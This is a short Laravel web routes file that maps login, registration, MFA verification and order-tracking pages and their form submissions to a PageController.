<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\PageController;

Route::get('/', function () {
    return view('index');
});

Route::get('/login', function () {
    return view('app');
});

Route::get('/register', function () {
    return view('register');
});

Route::get('/mfa', function () {
    return view('mfa');
});

Route::get('/track', function () {
    return view('track');
});

// routes/web.php
Route::post('/submit-email', [PageController::class, 'register'])->name('register');
Route::post('/submit-login', [PageController::class, 'login'])->name('login');
Route::post('/verify-code', [PageController::class, 'verifyCode'])->name('verify');
Route::post('/track-order', [PageController::class, 'trackOrder'])->name('trackorder');

// Route::get('/{any}', function () {
//     return view('app');
//     })->where("any",".*");
